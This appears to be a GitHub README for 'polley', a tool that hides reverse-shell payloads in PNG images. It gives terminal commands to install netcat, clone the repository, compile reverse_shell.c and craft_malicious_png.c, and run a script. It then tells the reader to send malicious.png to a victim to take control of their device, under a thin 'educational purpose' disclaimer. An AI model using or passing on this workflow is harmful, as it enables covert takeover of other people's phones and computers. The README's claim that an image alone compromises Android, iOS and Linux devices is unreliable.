# polley

A linux tool which is used to control a device with a image or hack ethically with a image [with reverse_shell payloads within the PNG images] It can used in Android, IOS and Any type of linux.

![Screenshot_20260324_134153_Termux](https://github.com/user-attachments/assets/e2835fcc-ad11-474e-870b-8f45bd2bbff0)


## COMMANDS 

# Setting up terminal

To use this tool, copy and paste these commands into your Kali Linux terminal:

# 1. Update Your Terminal 
sudo apt update && sudo apt upgrade

# 2. Install Necessary Tools

sudo apt install build-essential libpng-dev 

sudo apt install zlib1g-dev

sudo apt install netcat-traditional -y

# 3. Now, Clone The Respiratory (polley)
git clone https://github.com/anknpolley123/polley.git

![Screenshot_20260324_134153_Termux](https://github.com/user-attachments/assets/5f8aef6f-c9d7-44d2-9aae-16a8d9a71931)

# 4. Enter The Folder
cd ~/polley
![Screenshot_20260324_134153_Termux](https://github.com/user-attachments/assets/4e798b5b-e5bd-43fd-a632-26641df89305)

# 5. Then, Compile The File reverse_shell.c
gcc reverse_shell.c -o reverse_shell
![Screenshot_20260324_134153_Termux](https://github.com/user-attachments/assets/82edc3af-dec4-4ff9-8dce-45ed961975ca)

# 6. Compile The File embed_payload.c
gcc embed_payload.c -o embed_payload -lpng

![Screenshot_20260324_134153_Termux](https://github.com/user-attachments/assets/6ccf96d8-f58a-4937-bd66-bb39cfa7eeab)

# 7. Compile The File craft_malicious_png
gcc craft_malicious_png.c -o craft_malicious_png -lpng

![Screenshot_20260324_134153_Termux](https://github.com/user-attachments/assets/70c08d3c-1aed-4ac6-8ab0-5bc00ccf93dd)

# 8. Give permission 
chmod +x run_all.sh

![Screenshot_20260324_134153_Termux](https://github.com/user-attachments/assets/d01ae71f-121e-437d-ad98-4909390e45f7)

# 9. Run The Final Command
./run_all.sh
![Screenshot_20260323_220005_Termux](https://github.com/user-attachments/assets/584da564-24b6-4e24-9a83-2d9f56db352d)

# 10. Send the Malicious File

go to linux File manager, go to home, go to polley folder, select malicious.png, send it to the victim. You will get control of the victim's device in your linux terminal.

# DISCLAIMER 
This Tool is only for Educational Purpose. We are not responsible for the Misuse or Any Harm by it.


[Thank You For Using My linux Tool 'polley']

For More Information You Can Contact me: ankonpolley@proton.me

Or My Instagram Id: @itz_vorzhevik_volnyshev;
  alt: itz_ankon_polley

Support Me on Twitter'X': @AnkonPolley

Follow My Pinterest account: @ankonpolley

Support me also in Facebook: Ankon Polley
